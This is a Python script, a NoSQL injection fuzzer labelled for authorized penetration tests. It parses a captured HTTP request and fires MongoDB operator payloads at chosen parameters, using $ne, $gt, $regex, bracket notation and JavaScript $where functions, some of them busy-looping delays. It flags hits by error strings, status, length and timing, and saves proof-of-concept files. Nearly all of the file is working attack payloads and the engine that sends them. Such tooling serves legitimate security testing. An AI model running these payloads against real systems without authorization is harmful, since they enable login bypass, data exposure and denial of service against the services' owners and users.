#!/usr/bin/env python3
"""
nosql.py  –  NoSQL Injection Fuzzer for Authorized Pentests
============================================================
Handles:
  • GET  params  in URL query string  (?fromDate=x&toDate=y&team=4)
Usage:
  python3 nosql.py -r req.txt -p fromDate,toDate,team
  python3 nosql.py -r req.txt -p param1,param2 --proxy 127.0.0.1:8080
  python3 nosql.py -r req.txt -p user.password --dbtype mongodb --threads 3
"""

import argparse
import copy
import json
import os
import re
import sys
import time
import urllib.parse
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ═══════════════════════════════════════════════
#  COLOURS
# ═══════════════════════════════════════════════
R   = "\033[91m"
G   = "\033[92m"
Y   = "\033[93m"
B   = "\033[94m"
M   = "\033[95m"
W   = "\033[97m"
DIM = "\033[2m"
RST = "\033[0m"

BANNER = f"""{B}
  _   _       ____   ___  _        _____ _   _ ____________
 | \\ | | ___ / ___| / _ \\| |      |  ___| | | |___  /___  /
 |  \\| |/ _ \\\\___ \\| | | | |      | |_  | | | |  / /   / /
 | |\\  | (_) |___) | |_| | |___   |  _| | |_| | / /   / /
 |_| \\_|\\___/|____/ \\__\\_\\_____|  |_|    \\___/ /_/   /_/
{DIM}  NoSQL Injection Fuzzer  |  GET · POST · JSON · FORM  |  Authorized Use Only{RST}
"""

# ═══════════════════════════════════════════════
#  PAYLOAD LIBRARY
# ═══════════════════════════════════════════════

# --- JSON / dict payloads (used when field accepts objects) ---
MONGO_OBJ_PAYLOADS: List[Any] = [
    # Comparison operators
    {"$gt": ""},
    {"$gt": 0},
    {"$gte": ""},
    {"$lt": "z"},
    {"$lte": "z"},
    {"$ne": "invalid_xyz_nosql"},
    {"$ne": None},
    {"$ne": 0},
    # Regex
    {"$regex": ".*"},
    {"$regex": "^"},
    {"$regex": "^a"},
    # Existence
    {"$exists": True},
    {"$exists": False},
    # Array membership
    {"$in": ["admin", "user", "root", ""]},
    {"$in": [None, True, 1]},
    {"$nin": ["x_fake_x"]},
    # Type confusion combos
    {"$gt": "", "$lt": "zzzzzzzz"},
    {"$ne": None, "$exists": True},
    # Where / JS injection
    {"$where": "1==1"},
    {"$where": "true"},
    {"$where": "function(){return true;}"},
    {"$where": "function(){return this.password.length>0;}"},
    # Null byte
    "\x00",
]

# --- String payloads (injected as raw strings into the param value) ---
MONGO_STR_PAYLOADS: List[str] = [
    # JS / operator strings smuggled as values
    "';return true;//",
    "' || '1'=='1",
    "' || 1==1//",
    "\"; return true; //",
    "true, $where: '1==1",
    "{$gt: ''}",
    # Null byte string
    "admin\x00",
    "admin\x00extra",
    # Array index confusion
    "0",
    "-1",
    # Regex trigger
    ".*",
    "^",
    # BSON-breaking input
    "\\",
    "{",
    "}",
    # Very long string (buffer edge)
    "A" * 5000,
    # Date confusion (relevant for fromDate/toDate)
    "1970-01-01",
    "9999-12-31",
    "0",
    "-1",
    "null",
    "undefined",
    "true",
    "false",
    "[]",
    "{}",
]

# --- Timing / blind payloads (sent as objects, flag on Δtime) ---
TIMING_PAYLOADS: List[Any] = [
    {"$where": "function(){var d=new Date();while(new Date()-d<5000){}return true;}"},
    {"$where": "function(){var i=0;while(i<9999999){i++;}return true;}"},
    {"$where": "sleep(5000)||1==1"},
]

# --- Boolean true / false pairs for correlation ---
BOOL_TRUE:  List[Any] = [
    {"$gt": ""},
    {"$ne": "x_nosuchvalue_xyz"},
    {"$exists": True},
    {"$regex": ".*"},
]
BOOL_FALSE: List[Any] = [
    {"$gt": "zzzzzzzzzzzz"},
    {"$ne": ""},
    {"$exists": False},
    {"$regex": "^ZZZNOMATCH_XYZ$"},
]

# --- GET / query-string bracket notation (operator in key name) ---
# These become: ?param[$gt]=  or  ?param[%24gt]=
GET_BRACKET_OPERATORS: List[str] = [
    "[$gt]",
    "[$gte]",
    "[$lt]",
    "[$ne]",
    "[$exists]",
    "[$regex]",
    "[$in][]",
    "[$where]",
    "[%24gt]",
    "[%24ne]",
    "[%24exists]",
    "[%24regex]",
    "[%24where]",
]
GET_BRACKET_VALUES: List[str] = [
    "",
    "0",
    "true",
    "1==1",
    ".*",
    "invalid_xyz",
    "function(){return true;}",
]

# Error signatures to scan for in responses
ERROR_SIGNATURES: List[str] = [
    # MongoDB / drivers
    "MongoError", "MongoServerError", "CastError", "ValidationError",
    "BSONTypeError", "BSONError", "MongoParseError",
    "mongoose", "Mongoose", "mongodb",
    # Go-specific mongo drivers
    "mongo-driver", "mgo ", "qmgo", "go.mongodb.org",
    # Generic NoSQL / query errors
    "BSON", "$where", "query failed", "invalid operator",
    "operator error", "UnhandledPromiseRejection",
    "SyntaxError", "TypeError: Cannot",
    # Go runtime leaks
    "runtime error", "goroutine", "panic:",
    "json: cannot unmarshal",
    # Generic DB errors
    "database error", "db error", "query error",
]


# ═══════════════════════════════════════════════
#  REQUEST PARSER
# ═══════════════════════════════════════════════

def parse_raw_request(path: str) -> dict:
    """
    Parse a Burp-style raw HTTP request file.
    Returns a template dict with url, method, headers, body, query_params, body_type.
    """
    with open(path, "r", errors="replace") as fh:
        raw = fh.read()

    # Normalise line endings
    raw = raw.replace("\r\n", "\n").replace("\r", "\n")
    lines = raw.split("\n")

    # Request line
    request_line = lines[0].strip()
    parts = request_line.split(" ")
    if len(parts) < 2:
        raise ValueError(f"Invalid request line: {request_line}")
    method   = parts[0].upper()
    path_qs  = parts[1]

    # Headers
    headers: Dict[str, str] = {}
    i = 1
    while i < len(lines) and lines[i].strip():
        if ":" in lines[i]:
            k, v = lines[i].split(":", 1)
            headers[k.strip()] = v.strip()
        i += 1

    # Body (everything after the blank line)
    body = "\n".join(lines[i+1:]).strip()

    # Build URL
    host   = headers.get("Host", "localhost")
    scheme = "https"   # default to https for pentest targets
    url    = f"{scheme}://{host}{path_qs}"

    # Parse existing query params from URL
    parsed_url   = urllib.parse.urlparse(url)
    query_params = dict(urllib.parse.parse_qsl(parsed_url.query, keep_blank_values=True))
    base_url     = urllib.parse.urlunparse(parsed_url._replace(query=""))

    # Detect body type
    ct = headers.get("Content-Type", "")
    if "json" in ct:
        body_type = "json"
    elif "form" in ct or "urlencoded" in ct:
        body_type = "form"
    elif body and body.strip().startswith("{"):
        body_type = "json"
    elif body and "=" in body and not body.strip().startswith("{"):
        body_type = "form"
    else:
        body_type = "none"

    return {
        "method":       method,
        "url":          url,
        "base_url":     base_url,
        "headers":      headers,
        "body":         body,
        "body_type":    body_type,
        "query_params": query_params,   # dict of GET params
    }


def parse_body(raw_body: str, body_type: str) -> Tuple[Any, str]:
    """Parse body string into a usable dict."""
    if not raw_body:
        return {}, body_type
    if body_type == "json":
        try:
            return json.loads(raw_body), "json"
        except Exception:
            pass
    if body_type == "form":
        parsed = urllib.parse.parse_qs(raw_body, keep_blank_values=True)
        return {k: v[0] for k, v in parsed.items()}, "form"
    # Auto-detect
    try:
        return json.loads(raw_body), "json"
    except Exception:
        pass
    if "=" in raw_body:
        parsed = urllib.parse.parse_qs(raw_body, keep_blank_values=True)
        return {k: v[0] for k, v in parsed.items()}, "form"
    return raw_body, "raw"


def detect_param_location(param: str, query_params: dict, body_params: Any) -> str:
    """
    Auto-detect where a param lives: 'get', 'post', or 'both'.
    """
    in_get  = param in query_params
    in_post = isinstance(body_params, dict) and (
        param in body_params or
        any(param == k for k in body_params)
    )
    if in_get and in_post:
        return "both"
    if in_get:
        return "get"
    if in_post:
        return "post"
    # Not found in either — user specified it explicitly, try both
    return "both"


# ═══════════════════════════════════════════════
#  INJECTION HELPERS
# ═══════════════════════════════════════════════

def inject_into_dict(data: Any, param: str, payload: Any) -> Any:
    """Deep-copy dict and inject payload at param key (supports dot notation)."""
    mutated = copy.deepcopy(data) if data else {}
    if not isinstance(mutated, dict):
        return mutated
    keys = param.split(".")
    ref  = mutated
    for k in keys[:-1]:
        if k not in ref or not isinstance(ref[k], dict):
            ref[k] = {}
        ref = ref[k]
    ref[keys[-1]] = payload
    return mutated


def dict_to_body(data: Any, body_type: str) -> str:
    if body_type == "json":
        return json.dumps(data)
    if body_type == "form":
        # Handle nested dicts in form by flattening
        flat = {}
        for k, v in data.items():
            if isinstance(v, dict):
                flat[k] = json.dumps(v)
            elif isinstance(v, list):
                flat[k] = json.dumps(v)
            else:
                flat[k] = str(v) if v is not None else ""
        return urllib.parse.urlencode(flat)
    return str(data)


def build_url_with_params(base_url: str, params: dict) -> str:
    """Rebuild URL with given query params dict."""
    qs = urllib.parse.urlencode(params, doseq=True)
    return f"{base_url}?{qs}" if qs else base_url


def inject_into_url(base_url: str, query_params: dict, param: str, payload: Any) -> str:
    """Inject payload into a GET param and return new URL."""
    mutated = copy.deepcopy(query_params)
    if isinstance(payload, (dict, list)):
        # Encode complex types as JSON string in GET
        mutated[param] = json.dumps(payload)
    elif payload is None:
        mutated[param] = "null"
    elif isinstance(payload, bool):
        mutated[param] = "true" if payload else "false"
    else:
        mutated[param] = str(payload)
    return build_url_with_params(base_url, mutated)


def inject_bracket_into_url(base_url: str, query_params: dict,
                             param: str, bracket: str, value: str) -> str:
    """
    Inject bracket-notation payload:
    ?fromDate[$gt]=  →  bracket="[$gt]", value=""
    """
    mutated = copy.deepcopy(query_params)
    # Remove original param to replace with bracket version
    mutated.pop(param, None)
    bracket_key = f"{param}{bracket}"
    mutated[bracket_key] = value
    return build_url_with_params(base_url, mutated)


# ═══════════════════════════════════════════════
#  HTTP ENGINE
# ═══════════════════════════════════════════════

def send_request(req_template: dict, url: str, body_str: str,
                 proxy: Optional[str] = None, timeout: int = 15) -> dict:
    proxies  = {"http": f"http://{proxy}", "https": f"http://{proxy}"} if proxy else None
    headers  = dict(req_template["headers"])
    bt       = req_template.get("body_type", "none")

    # Set content-type only if there's a body
    if body_str and bt != "none":
        ct_map = {"json": "application/json", "form": "application/x-www-form-urlencoded"}
        headers["Content-Type"] = ct_map.get(bt, "application/json")

    # Strip hop-by-hop headers
    for h in ["Content-Length", "Transfer-Encoding", "Connection"]:
        headers.pop(h, None)

    t0 = time.time()
    try:
        resp = requests.request(
            method        = req_template["method"],
            url           = url,
            headers       = headers,
            data          = body_str if body_str else None,
            proxies       = proxies,
            verify        = False,
            timeout       = timeout,
            allow_redirects = False,
        )
        elapsed = time.time() - t0
        return {
            "status":  resp.status_code,
            "length":  len(resp.content),
            "time":    round(elapsed, 3),
            "body":    resp.text[:3000],
            "headers": dict(resp.headers),
            "error":   None,
        }
    except requests.exceptions.Timeout:
        return {"status": 0, "length": 0, "time": round(time.time()-t0, 3),
                "body": "", "headers": {}, "error": "TIMEOUT"}
    except Exception as e:
        return {"status": 0, "length": 0, "time": round(time.time()-t0, 3),
                "body": "", "headers": {}, "error": str(e)[:120]}


# ═══════════════════════════════════════════════
#  DETECTION
# ═══════════════════════════════════════════════

def check_errors(body: str) -> List[str]:
    return [sig for sig in ERROR_SIGNATURES if sig.lower() in body.lower()]


def make_verdict(result: dict, baseline: dict, timing_thr: float) -> dict:
    status_diff  = result["status"] != baseline["status"]
    len_delta    = abs(result["length"] - baseline["length"])
    time_delta   = result["time"] - baseline["time"]
    errors       = check_errors(result["body"])
    timed_out    = result["error"] == "TIMEOUT"
    req_error    = result["error"] and result["error"] != "TIMEOUT"

    if req_error:
        return {"level": "ERROR", "reasons": [f"Request error: {result['error']}"],
                "time_delta": round(time_delta, 3), "len_delta": len_delta, "errors": []}

    level   = "CLEAN"
    reasons = []

    if timed_out and timing_thr > 0:
        level = "CONFIRMED"; reasons.append(f"Request timed out → timing injection (threshold={timing_thr}s)")
    elif time_delta >= timing_thr and timing_thr > 0 and not req_error:
        level = "CONFIRMED"; reasons.append(f"Time delta +{time_delta:.2f}s ≥ threshold {timing_thr}s")

    if errors:
        level = "CONFIRMED"; reasons.append(f"DB error strings: {errors}")

    if not reasons:
        if status_diff and result["status"] in (200, 201, 302):
            level = "CONFIRMED"; reasons.append(f"Status {baseline['status']}→{result['status']} (success code on injected payload)")
        elif status_diff and len_delta > 100:
            level = "POTENTIAL"; reasons.append(f"Status {baseline['status']}→{result['status']}, Δlen={len_delta}")
        elif status_diff:
            level = "POTENTIAL"; reasons.append(f"Status changed: {baseline['status']}→{result['status']}")
        elif len_delta > 500:
            level = "POTENTIAL"; reasons.append(f"Large Δlen={len_delta} bytes")
        elif len_delta > 150:
            level = "POTENTIAL"; reasons.append(f"Δlen={len_delta} bytes (moderate anomaly)")

    return {"level": level, "reasons": reasons,
            "time_delta": round(time_delta, 3), "len_delta": len_delta, "errors": errors}


# ═══════════════════════════════════════════════
#  POC GENERATOR
# ═══════════════════════════════════════════════

def save_poc(req_template: dict, fuzz_url: str, body_str: str,
             param: str, payload: Any, result: dict, vdict: dict, ts: str) -> str:
    fname = f"poc_{param}_{ts}.txt"
    with open(fname, "w") as fh:
        fh.write("=" * 65 + "\n")
        fh.write("  NoSQL INJECTION – PROOF OF CONCEPT\n")
        fh.write(f"  Generated : {datetime.now().isoformat()}\n")
        fh.write("=" * 65 + "\n\n")
        fh.write(f"Verdict    : {vdict['level']}\n")
        fh.write(f"Reasons    : {'; '.join(vdict['reasons'])}\n")
        fh.write(f"Parameter  : {param}\n")
        payload_s = json.dumps(payload) if not isinstance(payload, str) else repr(payload)
        fh.write(f"Payload    : {payload_s}\n\n")
        fh.write("--- REQUEST ---\n")
        fh.write(f"{req_template['method']} {fuzz_url}\n")
        for k, v in req_template["headers"].items():
            fh.write(f"{k}: {v}\n")
        if body_str:
            fh.write(f"\n{body_str}\n")
        fh.write("\n--- RESPONSE ---\n")
        fh.write(f"Status  : {result['status']}\n")
        fh.write(f"Length  : {result['length']}\n")
        fh.write(f"Time    : {result['time']}s\n")
        fh.write(f"Δtime   : {vdict['time_delta']}s\n")
        fh.write(f"Δlength : {vdict['len_delta']}\n\n")
        fh.write("--- BODY EXCERPT ---\n")
        fh.write(result["body"][:1500] + "\n")
    return fname


# ═══════════════════════════════════════════════
#  FUZZER CORE
# ═══════════════════════════════════════════════

class Fuzzer:
    def __init__(self, req_template, parsed_body, body_type,
                 baseline, proxy, timing_thr, logger, ts, args):
        self.req      = req_template
        self.pbody    = parsed_body
        self.btype    = body_type
        self.baseline = baseline
        self.proxy    = proxy
        self.tthr     = timing_thr
        self.log      = logger
        self.ts       = ts
        self.args     = args
        self.findings = []

    # ── internal send + judge ──────────────────
    def _fire(self, url, body_str, param, payload, label=""):
        result = send_request(self.req, url, body_str, self.proxy)
        vdict  = make_verdict(result, self.baseline, self.tthr)
        pl_s   = json.dumps(payload) if not isinstance(payload, str) else repr(payload)

        line = (f"  [{vdict['level']:12s}] {label:6s} | param={param:20s} | "
                f"payload={pl_s[:55]:55s} | "
                f"status={result['status']} | len={result['length']:6d} | "
                f"time={result['time']:.2f}s | Δt={vdict['time_delta']:+.2f}s | "
                f"Δlen={vdict['len_delta']}")
        if vdict["reasons"]:
            line += f"\n         ↳ {'; '.join(vdict['reasons'])}"

        colour = {
            "CONFIRMED": R, "POTENTIAL": Y, "CLEAN": DIM, "ERROR": M
        }.get(vdict["level"], W)
        print(f"{colour}{line}{RST}")
        self.log(line.replace("\n", " | "))

        if vdict["level"] in ("CONFIRMED", "POTENTIAL"):
            poc = save_poc(self.req, url, body_str, param, payload, result, vdict, self.ts)
            msg = f"         ↳ {R}PoC saved → {poc}{RST}"
            print(msg)
            self.log(f"POC: {poc}")
            self.findings.append({"param": param, "payload": payload,
                                   "result": result, "verdict": vdict, "poc": poc,
                                   "label": label})
        time.sleep(0.12)
        return vdict["level"]

    # ── POST body fuzzing ──────────────────────
    def fuzz_post(self, param: str):
        print(f"\n{B}  [POST body] fuzzing param: {param}{RST}")
        self.log(f"[POST] param={param}")
        url = self.req["url"]

        for p in MONGO_OBJ_PAYLOADS:
            mutated  = inject_into_dict(self.pbody, param, p)
            body_str = dict_to_body(mutated, self.btype)
            self._fire(url, body_str, param, p, "POST-J")

        for p in MONGO_STR_PAYLOADS:
            mutated  = inject_into_dict(self.pbody, param, p)
            body_str = dict_to_body(mutated, self.btype)
            self._fire(url, body_str, param, p, "POST-S")

        for p in TIMING_PAYLOADS:
            mutated  = inject_into_dict(self.pbody, param, p)
            body_str = dict_to_body(mutated, self.btype)
            self._fire(url, body_str, param, p, "POST-T")

    # ── GET param fuzzing ──────────────────────
    def fuzz_get(self, param: str):
        print(f"\n{B}  [GET param] fuzzing param: {param}{RST}")
        self.log(f"[GET] param={param}")
        qp      = self.req["query_params"]
        base    = self.req["base_url"]
        body_str = self.req["body"]   # unchanged for GET requests

        # 1) Inject object payloads as JSON string in the value
        for p in MONGO_OBJ_PAYLOADS:
            fuzz_url = inject_into_url(base, qp, param, p)
            self._fire(fuzz_url, body_str, param, p, "GET-J")

        # 2) String payloads directly into value
        for p in MONGO_STR_PAYLOADS:
            fuzz_url = inject_into_url(base, qp, param, p)
            self._fire(fuzz_url, body_str, param, p, "GET-S")

        # 3) Bracket-notation operator injection
        #    ?fromDate[$gt]=  →  completely replaces the param
        print(f"{B}  [BRACKET] bracket-notation for: {param}{RST}")
        for bracket in GET_BRACKET_OPERATORS:
            for val in GET_BRACKET_VALUES:
                fuzz_url = inject_bracket_into_url(base, qp, param, bracket, val)
                payload_label = f"{param}{bracket}={val}"
                self._fire(fuzz_url, body_str, param, payload_label, "GET-B")

        # 4) Timing payloads into GET (as JSON string)
        for p in TIMING_PAYLOADS:
            fuzz_url = inject_into_url(base, qp, param, p)
            self._fire(fuzz_url, body_str, param, p, "GET-T")

    # ── Boolean correlation ────────────────────
    def boolean_correlation(self, param: str, location: str):
        print(f"\n{M}  [BOOL CORRELATION] param={param} location={location}{RST}")
        self.log(f"[BOOL] param={param} loc={location}")

        qp   = self.req["query_params"]
        base = self.req["base_url"]

        def measure(payloads, group):
            lengths = []
            for p in payloads:
                if location in ("get", "both"):
                    url = inject_into_url(base, qp, param, p)
                    r   = send_request(self.req, url, self.req["body"], self.proxy)
                else:
                    mutated  = inject_into_dict(self.pbody, param, p)
                    body_str = dict_to_body(mutated, self.btype)
                    r        = send_request(self.req, self.req["url"], body_str, self.proxy)
                lengths.append(r["length"])
                time.sleep(0.1)
            return lengths

        true_lens  = measure(BOOL_TRUE,  "true")
        false_lens = measure(BOOL_FALSE, "false")
        avg_t = sum(true_lens)  / len(true_lens)  if true_lens  else 0
        avg_f = sum(false_lens) / len(false_lens) if false_lens else 0
        delta = abs(avg_t - avg_f)

        msg = (f"  [BOOL_RESULT] param={param} | avg_TRUE_len={avg_t:.0f} | "
               f"avg_FALSE_len={avg_f:.0f} | delta={delta:.0f}")
        colour = R if delta > 300 else (Y if delta > 100 else DIM)
        verdict = "*** BOOLEAN INJECTION LIKELY ***" if delta > 100 else "no significant delta"
        print(f"{colour}{msg}  {verdict}{RST}")
        self.log(f"{msg} {verdict}")

        if delta > 100:
            self.findings.append({
                "param": param, "payload": "boolean-correlation",
                "result": {"status": "N/A", "length": avg_t, "time": 0, "body": ""},
                "verdict": {"level": "POTENTIAL",
                            "reasons": [f"Boolean delta={delta:.0f}"],
                            "time_delta": 0, "len_delta": int(delta), "errors": []},
                "poc": None, "label": "BOOL"
            })

    # ── Main entry ─────────────────────────────
    def run(self, params: List[str]):
        for param in params:
            loc = detect_param_location(param, self.req["query_params"], self.pbody)
            print(f"\n{W}{'═'*70}{RST}")
            print(f"{W}  PARAMETER: {param}   LOCATION: {loc.upper()}{RST}")
            print(f"{W}{'═'*70}{RST}")
            self.log(f"\n{'='*70}")
            self.log(f"PARAMETER: {param}  LOCATION: {loc}")
            self.log(f"{'='*70}")

            if loc in ("get", "both"):
                self.fuzz_get(param)
            if loc in ("post", "both"):
                self.fuzz_post(param)

            self.boolean_correlation(param, loc)


# ═══════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════

def main():
    print(BANNER)

    ap = argparse.ArgumentParser(description="NoSQL Injection Fuzzer")
    ap.add_argument("-r",  "--request",          required=True,  help="Burp raw request file")
    ap.add_argument("-p",  "--params",           required=True,  help="Comma-separated params to fuzz")
    ap.add_argument("--proxy",                   default=None,   help="Proxy host:port (e.g. 127.0.0.1:8080)")
    ap.add_argument("--dbtype",                  default="mongodb", choices=["mongodb","generic"])
    ap.add_argument("--timing-threshold",        default=4.0, type=float,
                    help="Seconds delta to flag timing injection (default: 4.0)")
    ap.add_argument("--timeout",                 default=15, type=int, help="Request timeout seconds")
    ap.add_argument("--scheme",                  default="https", choices=["http","https"],
                    help="Override scheme (default: https)")
    ap.add_argument("-o", "--output",            default=None,   help="Log file name")
    args = ap.parse_args()

    ts       = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_file = args.output or f"output-{ts}.log"
    params   = [p.strip() for p in args.params.split(",") if p.strip()]

    log_fh = open(log_file, "w")
    def logger(msg: str):
        log_fh.write(msg + "\n")
        log_fh.flush()

    logger(f"nosql.py  started={datetime.now().isoformat()}")
    logger(f"request={args.request}  params={params}  proxy={args.proxy}")
    logger(f"timing_threshold={args.timing_threshold}s  timeout={args.timeout}s")
    logger("=" * 70)

    # Parse request
    try:
        req_template = parse_raw_request(args.request)
    except FileNotFoundError:
        print(f"{R}[!] File not found: {args.request}{RST}"); sys.exit(1)
    except Exception as e:
        print(f"{R}[!] Parse error: {e}{RST}"); sys.exit(1)

    # Override scheme if asked
    if args.scheme == "http":
        req_template["url"]      = req_template["url"].replace("https://", "http://", 1)
        req_template["base_url"] = req_template["base_url"].replace("https://", "http://", 1)

    parsed_body, body_type = parse_body(req_template["body"], req_template["body_type"])
    req_template["body_type"] = body_type

    print(f"{B}[*] Target      : {req_template['url']}{RST}")
    print(f"{B}[*] Method      : {req_template['method']}{RST}")
    print(f"{B}[*] Body type   : {body_type}{RST}")
    print(f"{B}[*] GET params  : {list(req_template['query_params'].keys())}{RST}")
    print(f"{B}[*] POST params : {list(parsed_body.keys()) if isinstance(parsed_body, dict) else 'N/A'}{RST}")
    print(f"{B}[*] Fuzzing     : {params}{RST}")
    print(f"{B}[*] Proxy       : {args.proxy or 'none'}{RST}")
    print(f"{B}[*] Log         : {log_file}{RST}\n")

    # Baseline
    print(f"{G}[*] Sending baseline request...{RST}")
    baseline = send_request(req_template, req_template["url"],
                            req_template["body"], args.proxy, args.timeout)
    if baseline["error"]:
        print(f"{Y}[!] Baseline error: {baseline['error']} — results may be unreliable{RST}")
    else:
        print(f"{G}[+] Baseline: status={baseline['status']} | "
              f"len={baseline['length']} | time={baseline['time']}s{RST}\n")
    logger(f"[BASELINE] status={baseline['status']} len={baseline['length']} time={baseline['time']}s")

    # Run fuzzer
    fuzzer = Fuzzer(req_template, parsed_body, body_type,
                    baseline, args.proxy, args.timing_threshold, logger, ts, args)
    fuzzer.run(params)

    # ── Final Summary ──────────────────────────
    findings  = fuzzer.findings
    confirmed = [f for f in findings if f["verdict"]["level"] == "CONFIRMED"]
    potential = [f for f in findings if f["verdict"]["level"] == "POTENTIAL"]

    print(f"\n{W}{'═'*70}{RST}")
    print(f"{W}  FINAL SUMMARY{RST}")
    print(f"{W}{'═'*70}{RST}")
    logger("\n" + "="*70)
    logger("FINAL SUMMARY")
    logger("="*70)

    if not findings:
        print(f"{G}  [+] No anomalies detected.{RST}")
        logger("[RESULT] No anomalies detected.")
    else:
        print(f"{R}  CONFIRMED : {len(confirmed)}{RST}")
        print(f"{Y}  POTENTIAL : {len(potential)}{RST}")
        for f in confirmed + potential:
            pl = json.dumps(f['payload']) if not isinstance(f['payload'], str) else f['payload']
            line = (f"  [{f['verdict']['level']:9s}] [{f.get('label',''):6s}] "
                    f"param={f['param']} | payload={pl[:50]} | "
                    f"reasons={'; '.join(f['verdict']['reasons'])}")
            if f.get("poc"):
                line += f"\n               poc={f['poc']}"
            colour = R if f["verdict"]["level"] == "CONFIRMED" else Y
            print(f"{colour}{line}{RST}")
            logger(line.replace("\n", " | "))

    print(f"\n{B}[*] Log saved to: {log_file}{RST}")
    log_fh.close()


if __name__ == "__main__":
    main()
